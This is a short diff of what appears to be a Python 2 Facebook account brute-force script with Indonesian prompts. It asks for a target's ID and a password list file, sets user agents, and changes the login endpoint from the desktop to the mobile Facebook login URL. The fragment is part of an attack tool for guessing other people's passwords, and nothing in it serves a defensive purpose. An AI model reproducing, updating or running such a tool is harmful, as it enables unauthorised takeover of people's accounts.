@@ -49,7 +49,7 @@ def cover():
 cover()
 email = str(raw_input(GG + '[?]' + YY + ' Masukkan ID Target' + B + ' : '))
 passwordlist = str(raw_input(GG + '[?]' + YY + ' KETIK password.txt' + B + ' : '))
-login = 'https://www.facebook.com/login.php?login_attempt=1'
+login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=9'
 useragents = [
  ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
 
